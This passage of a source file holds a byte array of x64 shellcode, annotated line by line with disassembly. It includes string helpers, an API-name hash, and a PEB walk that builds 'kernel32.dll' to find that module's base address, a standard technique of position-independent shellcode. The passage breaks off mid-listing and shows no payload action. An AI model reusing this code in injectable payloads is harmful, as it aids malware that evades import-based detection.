  */    /* 034D */ &quot;\xcc&quot;                                             /* int3                                     */    /* 034E */ &quot;\xcc&quot;                                             /* int3                                     */    /* 034F */ &quot;\xcc&quot;                                             /* int3                                     */    /* 0350 */ &quot;\x88\x4c\x24\x08&quot;                                 /* mov [rsp+0x8], cl                        */    /* 0354 */ &quot;\x48\x83\xec\x38&quot;                                 /* sub rsp, 0x38                            */    /* 0358 */ &quot;\x0f\xb6\x4c\x24\x40&quot;                             /* movzx ecx, byte [rsp+0x40]               */    /* 035D */ &quot;\xe8\xae\xff\xff\xff&quot;                             /* call 0x310                               */    /* 0362 */ &quot;\x85\xc0&quot;                                         /* test eax, eax                            */    /* 0364 */ &quot;\x74\x0e&quot;                                         /* jz 0x374                                 */    /* 0366 */ &quot;\x0f\xbe\x44\x24\x40&quot;                             /* movsx eax, byte [rsp+0x40]               */    /* 036B */ &quot;\x83\xc0\x20&quot;                                     /* add eax, 0x20                            */    /* 036E */ &quot;\x89\x44\x24\x20&quot;                                 /* mov [rsp+0x20], eax                      */    /* 0372 */ &quot;\xeb\x09&quot;                                         /* jmp 0x37d                                */    /* 0374 */ &quot;\x0f\xbe\x44\x24\x40&quot;                             /* movsx eax, byte [rsp+0x40]               */    /* 0379 */ &quot;\x89\x44\x24\x20&quot;                                 /* mov [rsp+0x20], eax                      */    /* 037D */ &quot;\x0f\xb6\x44\x24\x20&quot;                             /* movzx eax, byte [rsp+0x20]               */    /* 0382 */ &quot;\x48\x83\xc4\x38&quot;                                 /* add rsp, 0x38                            */    /* 0386 */ &quot;\xc3&quot;                                             /* ret                                      */    /* 0387 */ &quot;\xcc&quot;                                             /* int3                                     */    /* 0388 */ &quot;\xcc&quot;                                             /* int3                                     */    /* 0389 */ &quot;\xcc&quot;                                             /* int3                                     */    /* 038A */ &quot;\xcc&quot;                                             /* int3                                     */    /* 038B */ &quot;\xcc&quot;                                             /* int3                                     */    /* 038C */ &quot;\xcc&quot;                                             /* int3                                     */    /* 038D */ &quot;\xcc&quot;                                             /* int3                                     */    /* 038E */ &quot;\xcc&quot;                                             /* int3                                     */    /* 038F */ &quot;\xcc&quot;                                             /* int3                                     */    /* 0390 */ &quot;\x48\x89\x4c\x24\x08&quot;                             /* mov [rsp+0x8], rcx                       */    /* 0395 */ &quot;\x48\x83\xec\x18&quot;                                 /* sub rsp, 0x18                            */    /* 0399 */ &quot;\xc7\x04\x24\x00\x00\x00\x00&quot;                     /* mov dword [rsp], 0x0                     */    /* 03A0 */ &quot;\x8b\x04\x24&quot;                                     /* mov eax, [rsp]                           */    /* 03A3 */ &quot;\x48\x8b\x4c\x24\x20&quot;                             /* mov rcx, [rsp+0x20]                      */    /* 03A8 */ &quot;\x0f\xb7\x04\x41&quot;                                 /* movzx eax, word [rcx+rax*2]              */    /* 03AC */ &quot;\x85\xc0&quot;                                         /* test eax, eax                            */    /* 03AE */ &quot;\x74\x0a&quot;                                         /* jz 0x3ba                                 */    /* 03B0 */ &quot;\x8b\x04\x24&quot;                                     /* mov eax, [rsp]                           */    /* 03B3 */ &quot;\xff\xc0&quot;                                         /* inc eax                                  */    /* 03B5 */ &quot;\x89\x04\x24&quot;                                     /* mov [rsp], eax                           */    /* 03B8 */ &quot;\xeb\xe6&quot;                                         /* jmp 0x3a0                                */    /* 03BA */ &quot;\x8b\x04\x24&quot;                                     /* mov eax, [rsp]                           */    /* 03BD */ &quot;\x48\x83\xc4\x18&quot;                                 /* add rsp, 0x18                            */    /* 03C1 */ &quot;\xc3&quot;                                             /* ret                                      */    /* 03C2 */ &quot;\xcc&quot;                                             /* int3                                     */    /* 03C3 */ &quot;\xcc&quot;                                             /* int3                                     */    /* 03C4 */ &quot;\xcc&quot;                                             /* int3                                     */    /* 03C5 */ &quot;\xcc&quot;                                             /* int3                                     */    /* 03C6 */ &quot;\xcc&quot;                                             /* int3                                     */    /* 03C7 */ &quot;\xcc&quot;                                             /* int3                                     */    /* 03C8 */ &quot;\xcc&quot;                                             /* int3                                     */    /* 03C9 */ &quot;\xcc&quot;                                             /* int3                                     */    /* 03CA */ &quot;\xcc&quot;                                             /* int3                                     */    /* 03CB */ &quot;\xcc&quot;                                             /* int3                                     */    /* 03CC */ &quot;\xcc&quot;                                             /* int3                                     */    /* 03CD */ &quot;\xcc&quot;                                             /* int3                                     */    /* 03CE */ &quot;\xcc&quot;                                             /* int3                                     */    /* 03CF */ &quot;\xcc&quot;                                             /* int3                                     */    /* 03D0 */ &quot;\x48\x89\x54\x24\x10&quot;                             /* mov [rsp+0x10], rdx                      */    /* 03D5 */ &quot;\x48\x89\x4c\x24\x08&quot;                             /* mov [rsp+0x8], rcx                       */    /* 03DA */ &quot;\x48\x83\xec\x38&quot;                                 /* sub rsp, 0x38                            */    /* 03DE */ &quot;\xb8\x01\x00\x00\x00&quot;                             /* mov eax, 0x1                             */    /* 03E3 */ &quot;\x48\x6b\xc0\x00&quot;                                 /* imul rax, rax, 0x0                       */    /* 03E7 */ &quot;\x48\x8b\x4c\x24\x48&quot;                             /* mov rcx, [rsp+0x48]                      */    /* 03EC */ &quot;\x0f\xb6\x04\x01&quot;                                 /* movzx eax, byte [rcx+rax]                */    /* 03F0 */ &quot;\x88\x44\x24\x22&quot;                                 /* mov [rsp+0x22], al                       */    /* 03F4 */ &quot;\x0f\xb6\x4c\x24\x22&quot;                             /* movzx ecx, byte [rsp+0x22]               */    /* 03F9 */ &quot;\xe8\x52\xff\xff\xff&quot;                             /* call 0x350                               */    /* 03FE */ &quot;\x88\x44\x24\x21&quot;                                 /* mov [rsp+0x21], al                       */    /* 0402 */ &quot;\x48\x8b\x44\x24\x48&quot;                             /* mov rax, [rsp+0x48]                      */    /* 0407 */ &quot;\x48\x83\xc0\x02&quot;                                 /* add rax, 0x2                             */    /* 040B */ &quot;\x48\x89\x44\x24\x48&quot;                             /* mov [rsp+0x48], rax                      */    /* 0410 */ &quot;\x0f\xbe\x44\x24\x21&quot;                             /* movsx eax, byte [rsp+0x21]               */    /* 0415 */ &quot;\x85\xc0&quot;                                         /* test eax, eax                            */    /* 0417 */ &quot;\x75\x07&quot;                                         /* jnz 0x420                                */    /* 0419 */ &quot;\x48\x8b\x44\x24\x40&quot;                             /* mov rax, [rsp+0x40]                      */    /* 041E */ &quot;\xeb\x7c&quot;                                         /* jmp 0x49c                                */    /* 0420 */ &quot;\x48\x8b\x4c\x24\x48&quot;                             /* mov rcx, [rsp+0x48]                      */    /* 0425 */ &quot;\xe8\x66\xff\xff\xff&quot;                             /* call 0x390                               */    /* 042A */ &quot;\x89\x44\x24\x24&quot;                                 /* mov [rsp+0x24], eax                      */    /* 042E */ &quot;\xb8\x01\x00\x00\x00&quot;                             /* mov eax, 0x1                             */    /* 0433 */ &quot;\x48\x6b\xc0\x00&quot;                                 /* imul rax, rax, 0x0                       */    /* 0437 */ &quot;\x48\x8b\x4c\x24\x40&quot;                             /* mov rcx, [rsp+0x40]                      */    /* 043C */ &quot;\x0f\xb6\x04\x01&quot;                                 /* movzx eax, byte [rcx+rax]                */    /* 0440 */ &quot;\x88\x44\x24\x23&quot;                                 /* mov [rsp+0x23], al                       */    /* 0444 */ &quot;\x0f\xb6\x4c\x24\x23&quot;                             /* movzx ecx, byte [rsp+0x23]               */    /* 0449 */ &quot;\xe8\x02\xff\xff\xff&quot;                             /* call 0x350                               */    /* 044E */ &quot;\x88\x44\x24\x20&quot;                                 /* mov [rsp+0x20], al                       */    /* 0452 */ &quot;\x48\x8b\x44\x24\x40&quot;                             /* mov rax, [rsp+0x40]                      */    /* 0457 */ &quot;\x48\x83\xc0\x02&quot;                                 /* add rax, 0x2                             */    /* 045B */ &quot;\x48\x89\x44\x24\x40&quot;                             /* mov [rsp+0x40], rax                      */    /* 0460 */ &quot;\x0f\xbe\x44\x24\x20&quot;                             /* movsx eax, byte [rsp+0x20]               */    /* 0465 */ &quot;\x85\xc0&quot;                                         /* test eax, eax                            */    /* 0467 */ &quot;\x75\x04&quot;                                         /* jnz 0x46d                                */    /* 0469 */ &quot;\x33\xc0&quot;                                         /* xor eax, eax                             */    /* 046B */ &quot;\xeb\x2f&quot;                                         /* jmp 0x49c                                */    /* 046D */ &quot;\x0f\xbe\x44\x24\x20&quot;                             /* movsx eax, byte [rsp+0x20]               */    /* 0472 */ &quot;\x0f\xbe\x4c\x24\x21&quot;                             /* movsx ecx, byte [rsp+0x21]               */    /* 0477 */ &quot;\x3b\xc1&quot;                                         /* cmp eax, ecx                             */    /* 0479 */ &quot;\x75\xb3&quot;                                         /* jnz 0x42e                                */    /* 047B */ &quot;\x44\x8b\x44\x24\x24&quot;                             /* mov r8d, [rsp+0x24]                      */    /* 0480 */ &quot;\x48\x8b\x54\x24\x48&quot;                             /* mov rdx, [rsp+0x48]                      */    /* 0485 */ &quot;\x48\x8b\x4c\x24\x40&quot;                             /* mov rcx, [rsp+0x40]                      */    /* 048A */ &quot;\xe8\x21\x00\x00\x00&quot;                             /* call 0x4b0                               */    /* 048F */ &quot;\x85\xc0&quot;                                         /* test eax, eax                            */    /* 0491 */ &quot;\x75\x9b&quot;                                         /* jnz 0x42e                                */    /* 0493 */ &quot;\x48\x8b\x44\x24\x40&quot;                             /* mov rax, [rsp+0x40]                      */    /* 0498 */ &quot;\x48\x83\xe8\x02&quot;                                 /* sub rax, 0x2                             */    /* 049C */ &quot;\x48\x83\xc4\x38&quot;                                 /* add rsp, 0x38                            */    /* 04A0 */ &quot;\xc3&quot;                                             /* ret                                      */    /* 04A1 */ &quot;\xcc&quot;                                             /* int3                                     */    /* 04A2 */ &quot;\xcc&quot;                                             /* int3                                     */    /* 04A3 */ &quot;\xcc&quot;                                             /* int3                                     */    /* 04A4 */ &quot;\xcc&quot;                                             /* int3                                     */    /* 04A5 */ &quot;\xcc&quot;                                             /* int3                                     */    /* 04A6 */ &quot;\xcc&quot;                                             /* int3                                     */    /* 04A7 */ &quot;\xcc&quot;                                             /* int3                                     */    /* 04A8 */ &quot;\xcc&quot;                                             /* int3                                     */    /* 04A9 */ &quot;\xcc&quot;                                             /* int3                                     */    /* 04AA */ &quot;\xcc&quot;                                             /* int3                                     */    /* 04AB */ &quot;\xcc&quot;                                             /* int3                                     */    /* 04AC */ &quot;\xcc&quot;                                             /* int3                                     */    /* 04AD */ &quot;\xcc&quot;                                             /* int3                                     */    /* 04AE */ &quot;\xcc&quot;                                             /* int3                                     */    /* 04AF */ &quot;\xcc&quot;                                             /* int3                                     */    /* 04B0 */ &quot;\x44\x89\x44\x24\x18&quot;                             /* mov [rsp+0x18], r8d                      */    /* 04B5 */ &quot;\x48\x89\x54\x24\x10&quot;                             /* mov [rsp+0x10], rdx                      */    /* 04BA */ &quot;\x48\x89\x4c\x24\x08&quot;                             /* mov [rsp+0x8], rcx                       */    /* 04BF */ &quot;\x48\x83\xec\x38&quot;                                 /* sub rsp, 0x38                            */    /* 04C3 */ &quot;\x8b\x44\x24\x50&quot;                                 /* mov eax, [rsp+0x50]                      */    /* 04C7 */ &quot;\xff\xc8&quot;                                         /* dec eax                                  */    /* 04C9 */ &quot;\x89\x44\x24\x50&quot;                                 /* mov [rsp+0x50], eax                      */    /* 04CD */ &quot;\xb8\x01\x00\x00\x00&quot;                             /* mov eax, 0x1                             */    /* 04D2 */ &quot;\x48\x6b\xc0\x00&quot;                                 /* imul rax, rax, 0x0                       */    /* 04D6 */ &quot;\x48\x8b\x4c\x24\x40&quot;                             /* mov rcx, [rsp+0x40]                      */    /* 04DB */ &quot;\x0f\xb6\x04\x01&quot;                                 /* movzx eax, byte [rcx+rax]                */    /* 04DF */ &quot;\x88\x44\x24\x20&quot;                                 /* mov [rsp+0x20], al                       */    /* 04E3 */ &quot;\x48\x8b\x44\x24\x40&quot;                             /* mov rax, [rsp+0x40]                      */    /* 04E8 */ &quot;\x48\x83\xc0\x02&quot;                                 /* add rax, 0x2                             */    /* 04EC */ &quot;\x48\x89\x44\x24\x40&quot;                             /* mov [rsp+0x40], rax                      */    /* 04F1 */ &quot;\xb8\x01\x00\x00\x00&quot;                             /* mov eax, 0x1                             */    /* 04F6 */ &quot;\x48\x6b\xc0\x00&quot;                                 /* imul rax, rax, 0x0                       */    /* 04FA */ &quot;\x48\x8b\x4c\x24\x48&quot;                             /* mov rcx, [rsp+0x48]                      */    /* 04FF */ &quot;\x0f\xb6\x04\x01&quot;                                 /* movzx eax, byte [rcx+rax]                */    /* 0503 */ &quot;\x88\x44\x24\x21&quot;                                 /* mov [rsp+0x21], al                       */    /* 0507 */ &quot;\x48\x8b\x44\x24\x48&quot;                             /* mov rax, [rsp+0x48]                      */    /* 050C */ &quot;\x48\x83\xc0\x02&quot;                                 /* add rax, 0x2                             */    /* 0510 */ &quot;\x48\x89\x44\x24\x48&quot;                             /* mov [rsp+0x48], rax                      */    /* 0515 */ &quot;\x0f\xb6\x4c\x24\x20&quot;                             /* movzx ecx, byte [rsp+0x20]               */    /* 051A */ &quot;\xe8\x31\xfe\xff\xff&quot;                             /* call 0x350                               */    /* 051F */ &quot;\x0f\xbe\xc0&quot;                                     /* movsx eax, al                            */    /* 0522 */ &quot;\x89\x44\x24\x28&quot;                                 /* mov [rsp+0x28], eax                      */    /* 0526 */ &quot;\x0f\xb6\x4c\x24\x21&quot;                             /* movzx ecx, byte [rsp+0x21]               */    /* 052B */ &quot;\xe8\x20\xfe\xff\xff&quot;                             /* call 0x350                               */    /* 0530 */ &quot;\x0f\xbe\xc0&quot;                                     /* movsx eax, al                            */    /* 0533 */ &quot;\x8b\x4c\x24\x28&quot;                                 /* mov ecx, [rsp+0x28]                      */    /* 0537 */ &quot;\x2b\xc8&quot;                                         /* sub ecx, eax                             */    /* 0539 */ &quot;\x8b\xc1&quot;                                         /* mov eax, ecx                             */    /* 053B */ &quot;\x89\x44\x24\x24&quot;                                 /* mov [rsp+0x24], eax                      */    /* 053F */ &quot;\x83\x7c\x24\x24\x00&quot;                             /* cmp dword [rsp+0x24], 0x0                */    /* 0544 */ &quot;\x75\x1d&quot;                                         /* jnz 0x563                                */    /* 0546 */ &quot;\x0f\xbe\x44\x24\x20&quot;                             /* movsx eax, byte [rsp+0x20]               */    /* 054B */ &quot;\x85\xc0&quot;                                         /* test eax, eax                            */    /* 054D */ &quot;\x74\x14&quot;                                         /* jz 0x563                                 */    /* 054F */ &quot;\x0f\xbe\x44\x24\x21&quot;                             /* movsx eax, byte [rsp+0x21]               */    /* 0554 */ &quot;\x85\xc0&quot;                                         /* test eax, eax                            */    /* 0556 */ &quot;\x74\x0b&quot;                                         /* jz 0x563                                 */    /* 0558 */ &quot;\x83\x7c\x24\x50\x00&quot;                             /* cmp dword [rsp+0x50], 0x0                */    /* 055D */ &quot;\x0f\x87\x60\xff\xff\xff&quot;                         /* ja 0x4c3                                 */    /* 0563 */ &quot;\x8b\x44\x24\x24&quot;                                 /* mov eax, [rsp+0x24]                      */    /* 0567 */ &quot;\x48\x83\xc4\x38&quot;                                 /* add rsp, 0x38                            */    /* 056B */ &quot;\xc3&quot;                                             /* ret                                      */    /* 056C */ &quot;\xcc&quot;                                             /* int3                                     */    /* 056D */ &quot;\xcc&quot;                                             /* int3                                     */    /* 056E */ &quot;\xcc&quot;                                             /* int3                                     */    /* 056F */ &quot;\xcc&quot;                                             /* int3                                     */    /* 0570 */ &quot;\x44\x89\x44\x24\x18&quot;                             /* mov [rsp+0x18], r8d                      */    /* 0575 */ &quot;\x48\x89\x54\x24\x10&quot;                             /* mov [rsp+0x10], rdx                      */    /* 057A */ &quot;\x48\x89\x4c\x24\x08&quot;                             /* mov [rsp+0x8], rcx                       */    /* 057F */ &quot;\x48\x83\xec\x28&quot;                                 /* sub rsp, 0x28                            */    /* 0583 */ &quot;\x48\x8b\x44\x24\x38&quot;                             /* mov rax, [rsp+0x38]                      */    /* 0588 */ &quot;\x48\x89\x44\x24\x10&quot;                             /* mov [rsp+0x10], rax                      */    /* 058D */ &quot;\x48\x8b\x44\x24\x30&quot;                             /* mov rax, [rsp+0x30]                      */    /* 0592 */ &quot;\x48\x89\x44\x24\x08&quot;                             /* mov [rsp+0x8], rax                       */    /* 0597 */ &quot;\x8b\x44\x24\x40&quot;                                 /* mov eax, [rsp+0x40]                      */    /* 059B */ &quot;\x89\x04\x24&quot;                                     /* mov [rsp], eax                           */    /* 059E */ &quot;\x8b\x44\x24\x40&quot;                                 /* mov eax, [rsp+0x40]                      */    /* 05A2 */ &quot;\xff\xc8&quot;                                         /* dec eax                                  */    /* 05A4 */ &quot;\x89\x44\x24\x40&quot;                                 /* mov [rsp+0x40], eax                      */    /* 05A8 */ &quot;\x83\x3c\x24\x00&quot;                                 /* cmp dword [rsp], 0x0                     */    /* 05AC */ &quot;\x74\x2b&quot;                                         /* jz 0x5d9                                 */    /* 05AE */ &quot;\x48\x8b\x44\x24\x08&quot;                             /* mov rax, [rsp+0x8]                       */    /* 05B3 */ &quot;\x48\x8b\x4c\x24\x10&quot;                             /* mov rcx, [rsp+0x10]                      */    /* 05B8 */ &quot;\x0f\xb6\x09&quot;                                     /* movzx ecx, byte [rcx]                    */    /* 05BB */ &quot;\x88\x08&quot;                                         /* mov [rax], cl                            */    /* 05BD */ &quot;\x48\x8b\x44\x24\x08&quot;                             /* mov rax, [rsp+0x8]                       */    /* 05C2 */ &quot;\x48\xff\xc0&quot;                                     /* inc rax                                  */    /* 05C5 */ &quot;\x48\x89\x44\x24\x08&quot;                             /* mov [rsp+0x8], rax                       */    /* 05CA */ &quot;\x48\x8b\x44\x24\x10&quot;                             /* mov rax, [rsp+0x10]                      */    /* 05CF */ &quot;\x48\xff\xc0&quot;                                     /* inc rax                                  */    /* 05D2 */ &quot;\x48\x89\x44\x24\x10&quot;                             /* mov [rsp+0x10], rax                      */    /* 05D7 */ &quot;\xeb\xbe&quot;                                         /* jmp 0x597                                */    /* 05D9 */ &quot;\x48\x8b\x44\x24\x30&quot;                             /* mov rax, [rsp+0x30]                      */    /* 05DE */ &quot;\x48\x83\xc4\x28&quot;                                 /* add rsp, 0x28                            */    /* 05E2 */ &quot;\xc3&quot;                                             /* ret                                      */    /* 05E3 */ &quot;\xcc&quot;                                             /* int3                                     */    /* 05E4 */ &quot;\xcc&quot;                                             /* int3                                     */    /* 05E5 */ &quot;\xcc&quot;                                             /* int3                                     */    /* 05E6 */ &quot;\xcc&quot;                                             /* int3                                     */    /* 05E7 */ &quot;\xcc&quot;                                             /* int3                                     */    /* 05E8 */ &quot;\xcc&quot;                                             /* int3                                     */    /* 05E9 */ &quot;\xcc&quot;                                             /* int3                                     */    /* 05EA */ &quot;\xcc&quot;                                             /* int3                                     */    /* 05EB */ &quot;\xcc&quot;                                             /* int3                                     */    /* 05EC */ &quot;\xcc&quot;                                             /* int3                                     */    /* 05ED */ &quot;\xcc&quot;                                             /* int3                                     */    /* 05EE */ &quot;\xcc&quot;                                             /* int3                                     */    /* 05EF */ &quot;\xcc&quot;                                             /* int3                                     */    /* 05F0 */ &quot;\x48\x89\x4c\x24\x08&quot;                             /* mov [rsp+0x8], rcx                       */    /* 05F5 */ &quot;\x48\x83\xec\x18&quot;                                 /* sub rsp, 0x18                            */    /* 05F9 */ &quot;\xc7\x04\x24\x00\x00\x00\x00&quot;                     /* mov dword [rsp], 0x0                     */    /* 0600 */ &quot;\x48\x8b\x44\x24\x20&quot;                             /* mov rax, [rsp+0x20]                      */    /* 0605 */ &quot;\x48\x89\x44\x24\x08&quot;                             /* mov [rsp+0x8], rax                       */    /* 060A */ &quot;\x8b\x04\x24&quot;                                     /* mov eax, [rsp]                           */    /* 060D */ &quot;\xc1\xe0\x07&quot;                                     /* shl eax, 0x7                             */    /* 0610 */ &quot;\x8b\x0c\x24&quot;                                     /* mov ecx, [rsp]                           */    /* 0613 */ &quot;\xc1\xe9\x19&quot;                                     /* shr ecx, 0x19                            */    /* 0616 */ &quot;\x03\xc1&quot;                                         /* add eax, ecx                             */    /* 0618 */ &quot;\x48\x8b\x4c\x24\x08&quot;                             /* mov rcx, [rsp+0x8]                       */    /* 061D */ &quot;\x0f\xb6\x09&quot;                                     /* movzx ecx, byte [rcx]                    */    /* 0620 */ &quot;\x03\xc1&quot;                                         /* add eax, ecx                             */    /* 0622 */ &quot;\x89\x04\x24&quot;                                     /* mov [rsp], eax                           */    /* 0625 */ &quot;\x48\x8b\x44\x24\x08&quot;                             /* mov rax, [rsp+0x8]                       */    /* 062A */ &quot;\x0f\xb6\x00&quot;                                     /* movzx eax, byte [rax]                    */    /* 062D */ &quot;\x89\x44\x24\x04&quot;                                 /* mov [rsp+0x4], eax                       */    /* 0631 */ &quot;\x48\x8b\x44\x24\x08&quot;                             /* mov rax, [rsp+0x8]                       */    /* 0636 */ &quot;\x48\xff\xc0&quot;                                     /* inc rax                                  */    /* 0639 */ &quot;\x48\x89\x44\x24\x08&quot;                             /* mov [rsp+0x8], rax                       */    /* 063E */ &quot;\x83\x7c\x24\x04\x00&quot;                             /* cmp dword [rsp+0x4], 0x0                 */    /* 0643 */ &quot;\x75\xc5&quot;                                         /* jnz 0x60a                                */    /* 0645 */ &quot;\x8b\x04\x24&quot;                                     /* mov eax, [rsp]                           */    /* 0648 */ &quot;\x48\x83\xc4\x18&quot;                                 /* add rsp, 0x18                            */    /* 064C */ &quot;\xc3&quot;                                             /* ret                                      */    /* 064D */ &quot;\xcc&quot;                                             /* int3                                     */    /* 064E */ &quot;\xcc&quot;                                             /* int3                                     */    /* 064F */ &quot;\xcc&quot;                                             /* int3                                     */    /* 0650 */ &quot;\x48\x81\xec\x88\x02\x00\x00&quot;                     /* sub rsp, 0x288                           */    /* 0657 */ &quot;\x48\xc7\x44\x24\x60\xff\xff\xff\xff&quot;             /* mov qword [rsp+0x60], 0xffffffffffffffff */    /* 0660 */ &quot;\x65\x48\x8b\x04\x25\x60\x00\x00\x00&quot;             /* mov rax, [gs:0x60]                       */    /* 0669 */ &quot;\x48\x89\x44\x24\x68&quot;                             /* mov [rsp+0x68], rax                      */    /* 066E */ &quot;\x48\x8b\x44\x24\x68&quot;                             /* mov rax, [rsp+0x68]                      */    /* 0673 */ &quot;\x48\x8b\x40\x18&quot;                                 /* mov rax, [rax+0x18]                      */    /* 0677 */ &quot;\x48\x83\xc0\x20&quot;                                 /* add rax, 0x20                            */    /* 067B */ &quot;\x48\x89\x44\x24\x58&quot;                             /* mov [rsp+0x58], rax                      */    /* 0680 */ &quot;\x48\x8b\x44\x24\x58&quot;                             /* mov rax, [rsp+0x58]                      */    /* 0685 */ &quot;\x48\x8b\x00&quot;                                     /* mov rax, [rax]                           */    /* 0688 */ &quot;\x48\x89\x44\x24\x30&quot;                             /* mov [rsp+0x30], rax                      */    /* 068D */ &quot;\xb8\x6b\x00\x00\x00&quot;                             /* mov eax, 0x6b                            */    /* 0692 */ &quot;\x66\x89\x44\x24\x38&quot;                             /* mov [rsp+0x38], ax                       */    /* 0697 */ &quot;\xb8\x65\x00\x00\x00&quot;                             /* mov eax, 0x65                            */    /* 069C */ &quot;\x66\x89\x44\x24\x3a&quot;                             /* mov [rsp+0x3a], ax                       */    /* 06A1 */ &quot;\xb8\x72\x00\x00\x00&quot;                             /* mov eax, 0x72                            */    /* 06A6 */ &quot;\x66\x89\x44\x24\x3c&quot;                             /* mov [rsp+0x3c], ax                       */    /* 06AB */ &quot;\xb8\x6e\x00\x00\x00&quot;                             /* mov eax, 0x6e                            */    /* 06B0 */ &quot;\x66\x89\x44\x24\x3e&quot;                             /* mov [rsp+0x3e], ax                       */    /* 06B5 */ &quot;\xb8\x65\x00\x00\x00&quot;                             /* mov eax, 0x65                            */    /* 06BA */ &quot;\x66\x89\x44\x24\x40&quot;                             /* mov [rsp+0x40], ax                       */    /* 06BF */ &quot;\xb8\x6c\x00\x00\x00&quot;                             /* mov eax, 0x6c                            */    /* 06C4 */ &quot;\x66\x89\x44\x24\x42&quot;                             /* mov [rsp+0x42], ax                       */    /* 06C9 */ &quot;\xb8\x33\x00\x00\x00&quot;                             /* mov eax, 0x33                            */    /* 06CE */ &quot;\x66\x89\x44\x24\x44&quot;                             /* mov [rsp+0x44], ax                       */    /* 06D3 */ &quot;\xb8\x32\x00\x00\x00&quot;                             /* mov eax, 0x32                            */    /* 06D8 */ &quot;\x66\x89\x44\x24\x46&quot;                             /* mov [rsp+0x46], ax                       */    /* 06DD */ &quot;\xb8\x2e\x00\x00\x00&quot;                             /* mov eax, 0x2e                            */    /* 06E2 */ &quot;\x66\x89\x44\x24\x48&quot;                             /* mov [rsp+0x48], ax                       */    /* 06E7 */ &quot;\xb8\x64\x00\x00\x00&quot;                             /* mov eax, 0x64                            */    /* 06EC */ &quot;\x66\x89\x44\x24\x4a&quot;                             /* mov [rsp+0x4a], ax                       */    /* 06F1 */ &quot;\xb8\x6c\x00\x00\x00&quot;                             /* mov eax, 0x6c                            */    /* 06F6 */ &quot;\x66\x89\x44\x24\x4c&quot;                             /* mov [rsp+0x4c], ax                       */    /* 06FB */ &quot;\xb8\x6c\x00\x00\x00&quot;                             /* mov eax, 0x6c                            */    /* 0700 */ &quot;\x66\x89\x44\x24\x4e&quot;                             /* mov [rsp+0x4e], ax                       */    /* 0705 */ &quot;\x33\xc0&quot;                                         /* xor eax, eax                             */    /* 0707 */ &quot;\x66\x89\x44\x24\x50&quot;                             /* mov [rsp+0x50], ax                       */    /* 070C */ &quot;\x48\x8b\x44\x24\x58&quot;                             /* mov rax, [rsp+0x58]                      */    /* 0711 */ &quot;\x48\x39\x44\x24\x30&quot;                             /* cmp [rsp+0x30], rax                      */    /* 0716 */ &quot;\x0f\x84\x8b\x00\x00\x00&quot;                         /* jz 0x7a7                                 */    /* 071C */ &quot;\x48\x8b\x44\x24\x30&quot;                             /* mov rax, [rsp+0x30]                      */    /* 0721 */ &quot;\x48\x83\xe8\x10&quot;                                 /* sub rax, 0x10                            */    /* 0725 */ &quot;\x48\x89\x44\x24\x28&quot;                             /* mov [rsp+0x28], rax                      */    /* 072A */ &quot;\x48\x8b\x44\x24\x28&quot;                             /* mov rax, [rsp+0x28]                      */    /* 072F */ &quot;\x0f\xb7\x40\x48&quot;                                 /* movzx eax, word [rax+0x48]               */    /* 0733 */ &quot;\x85\xc0&quot;                                         /* test eax, eax                            */    /* 0735 */ &quot;\x74\x5e&quot;                                         /* jz 0x795                                 */    /* 0737 */ &quot;\x48\x8b\x44\x24\x28&quot;                             /* mov rax, [rsp+0x28]                      */    /* 073C */ &quot;\x0f\xb7\x40\x48&quot;                                 /* movzx eax, word [rax+0x48]               */    /* 0740 */ &quot;\x89\x44\x24\x20&quot;                                 /* mov [rsp+0x20], eax                      */    /* 0744 */ &quot;\x44\x8b\x44\x24\x20&quot;                             /* mov r8d, [rsp+0x20]                      */    /* 0749 */ &quot;\x48\x8b\x44\x24\x28&quot;                             /* mov rax, [rsp+0x28]                      */    /* 074E */ &quot;\x48\x8b\x50\x50&quot;                                 /* mov rdx, [rax+0x50]                      */    /* 0752 */ &quot;\x48\x8d\x4c\x24\x70&quot;                             /* lea rcx, [rsp+0x70]                      */    /* 0757 */ &quot;\xe8\x14\xfe\xff\xff&quot;                             /* call 0x570                               */    /* 075C */ &quot;\x8b\x44\x24\x20&quot;                                 /* mov eax, [rsp+0x20]                      */    /* 0760 */ &quot;\x33\xd2&quot;                                         /* xor edx, edx                             */    /* 0762 */ &quot;\xb9\x02\x00\x00\x00&quot;                             /* mov ecx, 0x2                             */    /* 0767 */ &quot;\x48\xf7\xf1&quot;                                     /* div rcx                                  */    /* 076A */ &quot;\x33\xc9&quot;                                         /* xor ecx, ecx                             */    /* 076C */ &quot;\x66\x89\x4c\x44\x70&quot;                             /* mov [rsp+rax*2+0x70], cx                 */    /* 0771 */ &quot;\x48\x8d\x54\x24\x38&quot;                             /* lea rdx, [rsp+0x38]                      */    /* 0776 */ &quot;\x48\x8d\x4c\x24\x70&quot;                             /* lea rcx, [rsp+0x70]                      */    /* 077B */ &quot;\xe8\x50\xfc\xff\xff&quot;                             /* call 0x3d0                               */    /* 0780 */ &quot;\x48\x85\xc0&quot;                                     /* test rax, rax                            */    /* 0783 */ &quot;\x74\x10&quot;                                         /* jz 0x795                                 */    /* 0785 */ &quot;\x48\x8b\x44\x24\x28&quot;                             /* mov rax, [rsp+0x28]                      */    /* 078A */ &quot;\x48\x8b\x40\x30&quot;                                 /* mov rax, [rax+0x30]                      */    /* 078E */ &quot;\x48\x89\x44\x24\x60&quot;                             /* mov [rsp+0x60], rax                      */    /* 0793 */ &quot;\xeb\x12&quot;                                         /* jmp 0x7a7                                */    /* 0795 */ &quot;\x48\x8b\x44\x24\x30&quot;                             /* mov rax, [rsp+0x30]                      */    /* 079A */ &quot;\x48\x8b\x00&quot;                                     /* mov rax, [rax]                           */    /* 079D */ &quot;\x48\x89\x44\x24\x30&quot;                             /* mov [rsp+0x30], rax                      */    /* 07A2 */ &quot;\xe9\x65\xff\xff\xff&quot;                             /* jmp 0x70c                                */    /* 07A7 */ &quot;\x48\x8b\x44\x24\x60&quot;                             /* mov rax, [rsp+0x60]                      */    /* 07AC */ &quot;\x48\x81\xc4\x88\x02\x00\x00&quot;                     /* add rsp, 0x288                           */    /* 07B3 */ &quot;\xc3&quot;                                             /* ret                                      */    /* 07B4 */ &quot;\xcc&quot;                                             /* int3                                     */    /* 07B5 */ &quot;\xcc&quot;                                             /* int3                                     */    /* 07B6 */ &quot;\xcc&quot;                                             /* int3                                     */    /* 07B7 */ &quot;\xcc&quot;                                             /* int3                                     */    /* 07B8 */ &quot;\xcc&quot;                                             /* int3                                     */    /* 07B9 */ &quot;\xcc&quot;                                             /* int3                                     */    /* 07BA */ &quot;\xcc&quot;                                             /* int3                                     */    /* 07BB */ &quot;\xcc&quot;                                             /* int3                                     */    /* 07BC */ &quot;\xcc&quot;                                             /* 